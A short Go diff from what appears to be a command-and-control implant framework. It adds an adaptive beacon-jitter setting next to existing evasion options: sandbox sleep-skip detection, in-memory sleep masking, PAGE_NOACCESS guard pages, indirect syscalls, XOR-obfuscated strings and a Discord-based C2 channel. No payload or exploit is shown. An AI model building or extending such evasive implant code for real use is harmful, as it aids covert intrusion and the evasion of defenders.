@@ -49,6 +49,7 @@ var (
 	sandboxGuard           string = "" // Detect sleep skipping (sandbox fast-forward) and exit silently
 	sleepMask              string = "" // Encrypt sensitive agent/C2 data in memory during sleep cycles
 	sleepGuardPages        string = "" // VirtualProtect PAGE_NOACCESS on vault pages during sleep (Windows only)
+	jitterProfile          string = "" // Adaptive jitter profile: uniform, normal, exponential (empty = uniform)
 	discordBotToken        string = "" // Discord bot token for Discord C2 profile
 	discordChannelID       string = "" // Discord channel ID for Discord C2 profile
 	discordPollDelay       string = "" // Seconds between Discord message polls (default: 10)
@@ -129,6 +130,7 @@ func clearGlobals() {
 	indirectSyscalls = ""
 	sandboxGuard = ""
 	sleepMask = ""
+	jitterProfile = ""
 }
 
 // xorDecodeString decodes a base64-encoded XOR-encrypted string.
